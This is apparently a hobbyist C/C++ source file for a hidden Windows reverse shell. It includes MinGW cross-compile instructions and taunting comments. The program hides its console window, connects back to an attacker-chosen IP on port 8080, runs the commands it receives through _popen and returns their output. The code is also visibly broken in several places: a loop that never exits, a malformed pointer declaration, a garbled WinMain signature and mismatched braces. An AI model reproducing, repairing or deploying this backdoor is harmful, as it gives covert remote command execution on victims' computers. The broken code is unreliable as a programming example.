// build with c/c++ 
// i Had to use c bruh 
// i know c because its like c++ but c++ have better things
// TO MAKE THE FILE EXE Just open any linux os and type  (sudo apt install mingw-w64) and then just type (i686-w64-mingw32-g++ ReverseShell.cpp -o PythonIsShit.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc)
// I know u r going to paste it becasue ur script kidde ():
#include <stdio.h> // its a c libary not a c++ libary 
#include <unistd.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windowsx.h>
#include <string.h>
#include <winuser.h>
#include <wininet.h>
#include <sys/types.h>
#include <sys/stat.h>
#define bzero(p, size) (void)memset((p), 0, (size)) 
int sock; // I CREATED INT AND I CALLED IT SOCK U CAN CHANGE THE NAME DONT BE SCRIPT KIDDR OK 
void Shell()
{
char buffer[1042];
char container[1042];
char total_response[18384]; // the toatal response size is 18384 U can change it if u want to bro ():
while(TRUE)
{
    jump:
    bzero(buffer, sizeof(buffer));
    bzero(container, sizeof(container));
    bzero(total_response, sizeof(total_response));
    recv(sock, buffer, sizeof(buffer));
} // i can make it better for u but i dont want to ():
if (strncmp("q", buffer, 1) == 0)
{
    closesocket(sock);
    WSACleanup();
    exit(0);
}
else 
{

    FILE fp*;
    fp = _popen(buffer, "r");
    while(fgets(container, 1042, fp) != NULL)
    {
        strcat(total_response, container);
    }
    send(sock, total_response, sizeof(total_response))
    fclose(fp);
}
int APIENTRY WinMain(hInstance, hPrev, HINSTANCE, HINSTANCE, LPSTR, lpCmdLine, int nCmdShow)
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData;
    ServIP = ""; // Put U r local Host daddy ❤️
    ServPort = 8080; // Daddy u can put any port u want 
    if (WSAStartup(MAKEWORD(2,0 ), &wsaData) != 0)
    {

        exit(1);

    }
    sock = socket(AF_INET, SOCK_STREAM, 0);
    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    ServAddr.sin_port = htons(ServAddr);

    start: 
    while(connect(sock, (struct sockaddr*)&ServAddr, sizeof(ServAddr)) != 0)
    {
        Sleep(10); // u can make it 15 it doent really matter my friend ():
        goto start; // i made a c server so u dont use netcat ():


    }
    Shell();
}
}
```